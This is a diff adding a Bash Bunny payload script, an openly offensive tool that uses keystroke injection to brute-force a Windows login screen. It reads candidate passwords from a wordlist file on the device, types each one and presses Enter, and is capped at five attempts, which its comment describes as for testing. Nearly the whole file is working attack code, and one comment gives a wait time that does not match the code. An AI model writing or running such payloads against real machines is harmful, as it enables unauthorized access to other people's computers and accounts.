@@ -1,0 +1,30 @@
+#!/bin/bash
+
+# Bash Bunny payload to brute-force Windows login with passwords from password.txt
+# Note: Automatic detection of successful login is not possible with keystroke injection alone.
+# This script tries passwords sequentially. To "exit" when found, monitor the screen and unplug the Bunny when login succeeds.
+# Alternatively, limit attempts or add manual intervention.
+
+ATTACKMODE HID
+
+# Mount storage to access loot folder
+mount /dev/nandf /root/udisk/
+
+# ATTACK ONE: Loop through each password in the file (Read from loot/password.txt)
+count=0
+sed 's/\r$//' /root/udisk/loot/password.txt | while read -r word; do
+    if [ $count -ge 5 ]; then break; fi  # Limit to first 5 attempts for testing
+    # Type the password
+    QUACK STRING "$word"
+    # Press Enter
+    QUACK ENTER
+    # Wait 2 seconds
+    sleep 2
+    count=$((count+1))
+done
+
+# wait for 5 seconds before commencing next attacks
+sleep 2
+
+QUACK STRING EXECUTION COMPLETE!
+
